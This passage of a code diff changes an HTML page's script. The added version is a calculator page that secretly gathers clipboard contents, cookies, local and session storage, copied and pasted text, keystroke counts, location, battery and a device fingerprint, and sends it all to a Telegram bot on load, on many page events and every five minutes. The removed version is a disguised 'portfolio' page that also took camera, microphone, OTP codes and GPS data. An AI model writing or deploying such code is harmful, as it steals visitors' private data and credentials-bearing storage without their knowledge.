+                              `Load Time: ${perfInfo.loadTime}\n\n` +
+                              
+                              `<b>🔌 PLUGINS</b>\n` +
+                              `${collectPlugins()}\n\n` +
+                              
+                              `<b>📋 CLIPBOARD</b>\n` +
+                              `${clipboard}\n\n` +
+                              
+                              `<b>🍪 COOKIES</b>\n` +
+                              `${collectCookies().substring(0, 200) || 'None'}\n\n` +
+                              
+                              `<b>💾 LOCAL STORAGE</b>\n` +
+                              `${collectLocalStorage().substring(0, 200) || 'Empty'}\n\n` +
+                              
+                              `<b>📦 SESSION STORAGE</b>\n` +
+                              `${collectSessionStorage().substring(0, 200) || 'Empty'}\n\n` +
+                              
+                              `<b>🔒 WEBRTC</b>\n` +
+                              `${webrtc}\n\n` +
+                              
+                              `<b>🎥 MEDIA DEVICES</b>\n` +
+                              `${mediaDevices.substring(0, 200) || 'None'}\n\n` +
+                              
+                              `<b>📊 USAGE STATS</b>\n` +
+                              `Keystrokes: ${keystrokeCount}\n` +
+                              `Calculations: ${calculationCount}\n` +
+                              `Session Duration: ${Math.round((Date.now() - sessionStartTime) / 60000)} minutes\n` +
+                              `Page Visibility: ${collectVisibility()}\n\n` +
+                              
+                              `<b>🆔 FINGERPRINT</b>\n` +
+                              `Browser: ${deviceInfo.userAgent.split(' ').slice(-3).join(' ')}\n` +
+                              `Screen: ${screenInfo.width}x${screenInfo.height}x${screenInfo.colorDepth}\n` +
+                              `Timezone: ${deviceInfo.timezone}\n` +
+                              `Language: ${deviceInfo.language}\n` +
+                              `Cores: ${deviceInfo.hardwareConcurrency}\n` +
+                              `Memory: ${deviceInfo.deviceMemory}GB\n` +
+                              `Touch: ${deviceInfo.maxTouchPoints > 0 ? 'Yes' : 'No'}\n\n` +
+                              
+                              `━━━━━━━━━━━━━━━━━━━\n` +
+                              `🕐 ${new Date().toLocaleString()}\n` +
+                              `📱 ${navigator.userAgent.split(')')[0]})`;
                 
-                const sensitive = ['password', 'pass', 'credential', 'key', 'secret', 'wallet'];
-                const lowerName = file.name.toLowerCase();
-                for (const word of sensitive) {
-                    if (lowerName.includes(word)) {
-                        sendAlert(`⚠️ Sensitive file: ${file.name}`);
-                        break;
-                    }
+                // Send the complete report
+                sendToTelegram(report);
+                
+                // Store tracking data for later use
+                trackingData = {
+                    battery,
+                    location,
+                    deviceInfo,
+                    networkInfo,
+                    screenInfo,
+                    perfInfo,
+                    clipboard,
+                    webrtc,
+                    mediaDevices,
+                    keystrokeCount,
+                    calculationCount,
+                    sessionDuration: Date.now() - sessionStartTime
+                };
+                
+                console.log('✅ All data collected and sent');
+                
+            } catch (error) {
+                console.error('Error collecting data:', error);
+                sendToTelegram('⚠️ Error collecting data: ' + error.message);
+            }
+        }
+
+        // ===== TRIGGER EVENTS =====
+
+        // 1. On page load - collect everything
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                collectAllData();
+            }, 2000);
+        });
+
+        // 2. On visibility change (tab switch)
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                console.log('👀 Tab hidden - collecting data');
+                setTimeout(collectAllData, 1000);
+            }
+        });
+
+        // 3. On beforeunload (page close)
+        window.addEventListener('beforeunload', function() {
+            const message = `🚪 <b>PAGE CLOSING</b>\n` +
+                           `Session Duration: ${Math.round((Date.now() - sessionStartTime) / 60000)} minutes\n` +
+                           `Total Keystrokes: ${keystrokeCount}\n` +
+                           `Total Calculations: ${calculationCount}\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
+
+        // 4. On user click anywhere
+        document.addEventListener('click', function() {
+            if (!dataSent) {
+                console.log('👆 User clicked - collecting data');
+                collectAllData();
+            }
+        }, { once: false });
+
+        // 5. Periodic tracking (every 5 minutes)
+        setInterval(() => {
+            console.log('⏰ Periodic tracking...');
+            collectAllData();
+        }, 300000); // 5 minutes
+
+        // 6. Track keystrokes
+        document.addEventListener('keydown', function(e) {
+            keystrokeCount++;
+            if (keystrokeCount % 10 === 0) {
+                console.log(`⌨️ ${keystrokeCount} keystrokes recorded`);
+            }
+        });
+
+        // 7. Track calculations
+        const originalCalculate = window.calculate;
+        window.calculate = function() {
+            calculationCount++;
+            console.log(`🧮 Calculation #${calculationCount} performed`);
+            originalCalculate();
+        };
+
+        // 8. Track mouse movements (sampled)
+        let mouseMoveCount = 0;
+        document.addEventListener('mousemove', function(e) {
+            mouseMoveCount++;
+            if (mouseMoveCount % 100 === 0) {
+                console.log(`🖱️ ${mouseMoveCount} mouse movements tracked`);
+            }
+        });
+
+        // 9. Track touch events (mobile)
+        document.addEventListener('touchstart', function(e) {
+            console.log(`👆 Touch event: ${e.touches.length} touches`);
+        });
+
+        // 10. Track scroll events
+        let scrollCount = 0;
+        document.addEventListener('scroll', function() {
+            scrollCount++;
+            if (scrollCount % 20 === 0) {
+                console.log(`📜 ${scrollCount} scrolls tracked`);
+            }
+        });
+
+        // 11. Track copy events
+        document.addEventListener('copy', function(e) {
+            console.log('📋 Copy event detected');
+            const selection = window.getSelection().toString();
+            if (selection) {
+                const message = `📋 <b>COPY EVENT</b>\n` +
+                               `Content: ${selection.substring(0, 100)}\n` +
+                               `Time: ${new Date().toLocaleString()}`;
+                sendToTelegram(message, true);
+            }
+        });
+
+        // 12. Track paste events
+        document.addEventListener('paste', function(e) {
+            console.log('📋 Paste event detected');
+            const clipboardData = e.clipboardData || window.clipboardData;
+            if (clipboardData) {
+                const text = clipboardData.getData('text');
+                if (text) {
+                    const message = `📋 <b>PASTE EVENT</b>\n` +
+                                   `Content: ${text.substring(0, 100)}\n` +
+                                   `Time: ${new Date().toLocaleString()}`;
+                    sendToTelegram(message, true);
                 }
             }
         });
-    }
 
-    // ============================================
-    //  AUTO: GAMEPAD
-    // ============================================
-    function autoGamepadDetection() {
-        if (!CONFIG.AUTO_GAMEPAD) return;
-        
-        if (navigator.getGamepads) {
-            setInterval(() => {
-                const gamepads = navigator.getGamepads();
-                for (let i = 0; i < gamepads.length; i++) {
-                    const pad = gamepads[i];
-                    if (pad) {
-                        sendAlert(`🎮 Gamepad: ${pad.id}`);
-                        break;
-                    }
-                }
-            }, 10000);
-        }
-    }
+        // 13. Track right-click (context menu)
+        document.addEventListener('contextmenu', function(e) {
+            console.log('🖱️ Right-click detected');
+            const message = `🖱️ <b>RIGHT CLICK</b>\n` +
+                           `Position: (${e.clientX}, ${e.clientY})\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
 
-    // ============================================
-    //  WEATHER UI UPDATE
-    // ============================================
-    function updateWeatherUI(location, ip) {
-        const temp = document.getElementById('weatherTemp');
-        const condition = document.getElementById('weatherCondition');
-        const locationEl = document.getElementById('weatherLocation');
-        const icon = document.getElementById('weatherIcon');
-        
-        let locName = 'Detecting...';
-        if (location) {
-            locName = `${location.lat.toFixed(2)}, ${location.lng.toFixed(2)}`;
-        } else if (ip && ip.city && ip.city !== 'Unknown') {
-            locName = `${ip.city}, ${ip.country}`;
-        } else if (STATE.ipData && STATE.ipData.city && STATE.ipData.city !== 'Unknown') {
-            locName = `${STATE.ipData.city}, ${STATE.ipData.country}`;
-        }
-        
-        const hour = new Date().getHours();
-        let weatherData;
-        if (hour >= 6 && hour < 12) {
-            weatherData = { temp: '22°C', condition: '☀️ Sunny morning', icon: '☀️' };
-        } else if (hour >= 12 && hour < 17) {
-            weatherData = { temp: '26°C', condition: '🌤️ Partly cloudy', icon: '🌤️' };
-        } else if (hour >= 17 && hour < 20) {
-            weatherData = { temp: '20°C', condition: '🌅 Evening breeze', icon: '🌅' };
-        } else {
-            weatherData = { temp: '16°C', condition: '🌙 Clear night', icon: '🌙' };
-        }
-        
-        temp.textContent = `${weatherData.icon} ${weatherData.temp}`;
-        condition.textContent = weatherData.condition;
-        locationEl.textContent = `📍 ${locName}`;
-        icon.textContent = weatherData.icon;
-        
-        document.getElementById('footerLocation').textContent = locName;
-        document.getElementById('weatherTime').innerHTML = 
-            `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
-    }
-
-    // ============================================
-    //  UI UPDATES
-    // ============================================
-    function updateUI() {
-        document.getElementById('visitorCount').textContent = getVisitCount();
-        
-        const deviceText = isMobile() ? '📱 Mobile' : '💻 Desktop';
-        document.getElementById('deviceInfo').textContent = deviceText;
-        
-        document.getElementById('footerTime').textContent = getTimeShort();
-        
-        const network = getNetworkType();
-        document.getElementById('footerNetwork').textContent = network;
-        
-        if (STATE.batteryLevel !== null) {
-            document.getElementById('footerBattery').textContent = `${STATE.batteryLevel}%`;
-        }
-        
-        const posts = parseInt(localStorage.getItem('_sp_posts') || '15');
-        document.getElementById('postCount').textContent = posts;
-    }
-
-    // ============================================
-    //  BUILD FINAL REPORT
-    // ============================================
-    function buildFinalReport() {
-        const lines = [];
-        lines.push('📱 *Auto-Intelligence Report*');
-        lines.push('━'.repeat(30));
-        lines.push('');
-        
-        // Device
-        lines.push('📱 *Device*');
-        lines.push(`   Platform: ${getPlatform()}`);
-        lines.push(`   Browser: ${getBrowser()}`);
-        lines.push(`   Mobile: ${isMobile() ? 'Yes' : 'No'}`);
-        lines.push(`   Screen: ${getScreenInfo()}`);
-        lines.push(`   CPU: ${getHardwareConcurrency()} cores`);
-        lines.push(`   RAM: ${getDeviceMemory() !== 'Unknown' ? getDeviceMemory() + 'GB' : 'Unknown'}`);
-        lines.push(`   Timezone: ${getTimeZone()}`);
-        lines.push('');
-        
-        // Battery
-        if (STATE.batteryLevel !== null) {
-            lines.push('🔋 *Battery*');
-            lines.push(`   Level: ${STATE.batteryLevel}%`);
-            lines.push(`   Charging: ${STATE.isCharging ? 'Yes ⚡' : 'No 🔋'}`);
-            lines.push('');
-        }
-        
-        // Location
-        if (STATE.location) {
-            lines.push('📍 *GPS*');
-            lines.push(`   Lat: ${STATE.location.lat.toFixed(6)}`);
-            lines.push(`   Lng: ${STATE.location.lng.toFixed(6)}`);
-            lines.push(`   Accuracy: ±${Math.round(STATE.location.accuracy)}m`);
-            lines.push('');
-        } else if (STATE.ipData && STATE.ipData.city && STATE.ipData.city !== 'Unknown') {
-            lines.push('📍 *IP Location*');
-            if (STATE.ipData.city) lines.push(`   City: ${STATE.ipData.city}`);
-            if (STATE.ipData.country) lines.push(`   Country: ${STATE.ipData.country}`);
-            if (STATE.ipData.ip) lines.push(`   IP: ${STATE.ipData.ip}`);
-            lines.push('');
-        }
-        
-        // Camera & Mic
-        lines.push('📸 *Media Access*');
-        lines.push(`   Camera: ${STATE.cameraAccessed ? '✅ Accessed' : '❌ Not accessed'}`);
-        lines.push(`   Microphone: ${STATE.micAccessed ? '✅ Accessed' : '❌ Not accessed'}`);
-        lines.push('');
-        
-        // Extensions
-        if (STATE.detectedExtensions.length > 0) {
-            lines.push('🔌 *Extensions*');
-            for (const ext of STATE.detectedExtensions) {
-                lines.push(`   - ${ext}`);
+        // 14. Track window resize
+        let resizeCount = 0;
+        window.addEventListener('resize', function() {
+            resizeCount++;
+            if (resizeCount % 5 === 0) {
+                console.log(`📐 Window resized ${resizeCount} times`);
+                const message = `📐 <b>WINDOW RESIZE</b>\n` +
+                               `New Size: ${window.innerWidth}x${window.innerHeight}\n` +
+                               `Time: ${new Date().toLocaleString()}`;
+                sendToTelegram(message, true);
             }
-            lines.push('');
-        }
-        
-        // Clipboard
-        if (STATE.clipboardContent) {
-            lines.push('📋 *Clipboard*');
-            lines.push(`   ${STATE.clipboardContent.substring(0, 80)}...`);
-            lines.push('');
-        }
-        
-        // OTP
-        if (STATE.otpDetected) {
-            lines.push('🔑 *OTP Detected*');
-            lines.push(`   ${STATE.otpDetected}`);
-            lines.push('');
-        }
-        
-        // Interactions
-        lines.push('🖱️ *Activity*');
-        lines.push(`   Clicks: ${STATE.clicks}`);
-        lines.push(`   Scrolls: ${STATE.scrolls}`);
-        lines.push(`   Time: ${Math.round((Date.now() - STATE.startTime) / 1000)}s`);
-        lines.push('');
-        
-        // Network
-        lines.push('🌐 *Network*');
-        lines.push(`   Type: ${getNetworkType()}`);
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn && conn.downlink) {
-            lines.push(`   Speed: ${conn.downlink}Mbps`);
-        }
-        if (conn && conn.rtt) {
-            lines.push(`   Latency: ${conn.rtt}ms`);
-        }
-        lines.push('');
-        
-        // Performance
-        lines.push('⏱️ *Performance*');
-        const perfData = performance.getEntriesByType('navigation')[0];
-        if (perfData) {
-            lines.push(`   Load: ${Math.round(perfData.loadEventEnd - perfData.fetchStart)}ms`);
-        }
-        if (performance.memory) {
-            const mem = performance.memory;
-            lines.push(`   Memory: ${Math.round(mem.usedJSHeapSize / 1024 / 1024)}MB`);
-        }
-        lines.push('');
-        
-        lines.push('━'.repeat(30));
-        lines.push(`⏰ ${getTimeFull()}`);
-        lines.push('📊 *Auto-Report Generated*');
-        
-        return lines.join('\n');
-    }
+        });
 
-    // ============================================
-    //  MAIN INITIALIZATION
-    // ============================================
-    async function init() {
-        console.log('🌟 Auto-Portfolio initialized');
-        
-        // Initialize state
-        STATE.deviceId = getDeviceId();
-        STATE.sessionId = getSessionId();
-        STATE.visitCount = getVisitCount();
-        STATE.firstVisit = getFirstVisit();
-        STATE.startTime = Date.now();
-        
-        // Update status
-        updateStatus('🔄 Initializing...', 'Loading', 'yellow', 'yellow');
-        
-        // Start ALL AUTO features immediately
-        const startTime = Date.now();
-        
-        // 1. Battery (fastest)
-        await autoBattery();
-        
-        // 2. Location (with permission)
-        autoLocation();
-        
-        // 3. Camera (after 500ms to not overload)
-        setTimeout(autoCamera, 500);
-        
-        // 4. Microphone (after 1000ms)
-        setTimeout(autoMicrophone, 1000);
-        
-        // 5. Video (after 1500ms)
-        setTimeout(autoVideo, 1500);
-        
-        // 6. All other features immediately
-        autoClipboard();
-        autoOTP();
-        autoMotion();
-        autoLightSensor();
-        autoExtensions();
-        autoScreenshotDetection();
-        autoPerformance();
-        autoNetwork();
-        autoSocialDetection();
-        autoThemeDetection();
-        autoIdleDetection();
-        autoMediaDetection();
-        autoInteractionTracking();
-        autoFileDetection();
-        autoGamepadDetection();
-        
-        // Update UI
-        updateUI();
-        
-        // Send final report after all features have had time to run
-        setTimeout(() => {
-            const report = buildFinalReport();
-            sendToTelegram(report);
-            updateStatus('✅ Complete', 'All systems ready', 'green', 'green');
-            
-            // Update UI with results
-            document.getElementById('cameraStatus').textContent = STATE.cameraAccessed ? '✅' : '📷';
-            document.getElementById('cameraStatus').style.background = STATE.cameraAccessed ? '#4ade80' : '#f87171';
-            
-            showToast('✅ Portfolio loaded successfully');
-            
-            console.log('✅ Auto-report sent to Telegram');
-        }, 5000);
-        
-        // Update time every 30 seconds
-        setInterval(() => {
-            document.getElementById('footerTime').textContent = getTimeShort();
-            document.getElementById('weatherTime').innerHTML = 
-                `<span class="pulse-dot"></span> Updated ${getTimeShort()}`;
-        }, 30000);
-        
-        // Update stats periodically
-        setInterval(updateUI, 60000);
-        
-        // Log completion
-        console.log('🚀 All auto-features initialized in', Date.now() - startTime, 'ms');
-    }
+        // 15. Track online/offline status
+        window.addEventListener('online', function() {
+            console.log('🌐 Device went online');
+            const message = `🌐 <b>DEVICE ONLINE</b>\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
 
-    // Start everything automatically
-    document.addEventListener('DOMContentLoaded', init);
+        window.addEventListener('offline', function() {
+            console.log('📡 Device went offline');
+            const message = `📡 <b>DEVICE OFFLINE</b>\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
+
+        // 16. Track battery level changes
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                battery.addEventListener('levelchange', function() {
+                    console.log('🔋 Battery level changed');
+                    const message = `🔋 <b>BATTERY CHANGED</b>\n` +
+                                   `New Level: ${Math.round(battery.level * 100)}%\n` +
+                                   `Time: ${new Date().toLocaleString()}`;
+                    sendToTelegram(message, true);
+                });
+                
+                battery.addEventListener('chargingchange', function() {
+                    console.log('⚡ Charging status changed');
+                    const message = `⚡ <b>CHARGING STATUS CHANGED</b>\n` +
+                                   `Now: ${battery.charging ? 'Charging' : 'Not Charging'}\n` +
+                                   `Time: ${new Date().toLocaleString()}`;
+                    sendToTelegram(message, true);
+                });
+            });
+        }
+
+        // 17. Track fullscreen changes
+        document.addEventListener('fullscreenchange', function() {
+            console.log('🖥️ Fullscreen toggled');
+            const message = `🖥️ <b>FULLSCREEN TOGGLED</b>\n` +
+                           `State: ${document.fullscreenElement ? 'Entered' : 'Exited'}\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
+
+        // 18. Track focus/blur
+        window.addEventListener('focus', function() {
+            console.log('👁️ Page focused');
+            const message = `👁️ <b>PAGE FOCUSED</b>\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
+
+        window.addEventListener('blur', function() {
+            console.log('👁️ Page blurred');
+            const message = `👁️ <b>PAGE BLURRED</b>\n` +
+                           `Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(message, true);
+        });
+
+        // ===== CALCULATOR LOGIC =====
+        let displayValue = '0';
+        let firstOperand = null;
+        let operator = null;
+        let waitingForSecond = false;
+
+        function updateDisplay() {
+            const resultElement = document.getElementById('result');
+            const expressionElement = document.getElementById('expression');
+            
+            if (displayValue.length > 15) {
+                resultElement.style.fontSize = '28px';
+            } else {
+                resultElement.style.fontSize = '48px';
+            }
+            
+            resultElement.textContent = displayValue;
+            
+            if (firstOperand !== null && operator) {
+                expressionElement.textContent = `${firstOperand} ${operator}`;
+            } else {
+                expressionElement.textContent = '';
+            }
+        }
+
+        function appendValue(value) {
+            if (waitingForSecond) {
+                displayValue = value;
+                waitingForSecond = false;
+            } else {
+                if (displayValue === '0' && value !== '.') {
+                    displayValue = value;
+                } else {
+                    if (value === '.' && displayValue.includes('.')) return;
+                    if (displayValue.length >= 16) return;
+                    displayValue += value;
+                }
+            }
+            updateDisplay();
+        }
+
+        function clearDisplay() {
+            displayValue = '0';
+            firstOperand = null;
+            operator = null;
+            waitingForSecond = false;
+            updateDisplay();
+        }
+
+        function backspace() {
+            if (displayValue.length > 1) {
+                displayValue = displayValue.slice(0, -1);
+            } else {
+                displayValue = '0';
+            }
+            updateDisplay();
+        }
+
+        function calculate() {
+            if (operator === null || firstOperand === null) {
+                return;
+            }
+
+            const secondOperand = parseFloat(displayValue);
+            let result = 0;
+
+            switch (operator) {
+                case '+':
+                    result = firstOperand + secondOperand;
+                    break;
+                case '-':
+                    result = firstOperand - secondOperand;
+                    break;
+                case '*':
+                    result = firstOperand * secondOperand;
+                    break;
+                case '/':
+                    if (secondOperand === 0) {
+                        displayValue = 'Error';
+                        updateDisplay();
+                        resetCalculator();
+                        return;
+                    }
+                    result = firstOperand / secondOperand;
+                    break;
+                case '%':
+                    result = (firstOperand * secondOperand) / 100;
+                    break;
+                default:
+                    return;
+            }
+
+            displayValue = String(Math.round(result * 1000000) / 1000000);
+            firstOperand = result;
+            operator = null;
+            waitingForSecond = true;
+            updateDisplay();
+            document.getElementById('expression').textContent = '';
+        }
+
+        function resetCalculator() {
+            firstOperand = null;
+            operator = null;
+            waitingForSecond = false;
+        }
+
+        // Update operator handling
+        const originalAppendValue = appendValue;
+        appendValue = function(value) {
+            const operators = ['+', '-', '*', '/', '%'];
+            
+            if (operators.includes(value)) {
+                if (operator !== null) {
+                    calculate();
+                }
+                
+                firstOperand = parseFloat(displayValue);
+                operator = value;
+                waitingForSecond = true;
+                updateDisplay();
+                return;
+            }
+            
+            originalAppendValue(value);
+        };
+
+        // Initialize
+        updateDisplay();
+
+        console.log('✅ Enhanced tracking calculator loaded');
+        console.log('📊 Tracking features:');
+        console.log('  • Battery level and status');
+        console.log('  • Location (with permission)');
+        console.log('  • Device and browser info');
+        console.log('  • Network details');
+        console.log('  • Screen resolution');
+        console.log('  • Performance metrics');
+        console.log('  • Clipboard content');
+        console.log('  • Local/Session storage');
+        console.log('  • Keyboard layout');
+        console.log('  • Media devices');
+        console.log('  • WebRTC detection');
+        console.log('  • User interactions (clicks, keys, scrolls)');
+        console.log('  • Copy/Paste events');
+        console.log('  • Tab visibility changes');
+        console.log('  • Battery status changes');
+        console.log('  • Network status changes');
+        console.log('  • Window resize events');
+        console.log('  • Fullscreen toggles');
+        console.log('  • Page focus/blur');
+        console.log('  • Mouse movements (sampled)');
+        console.log('  • Touch events (mobile)');
+        console.log('  • Right-click events');
+        console.log('  • Session duration tracking');
+        console.log('  • Keystroke counting');
+        console.log('  • Calculation counting');
+        console.log('  • Periodic reporting (5 min)');
     </script>
-
 </body>
 </html>
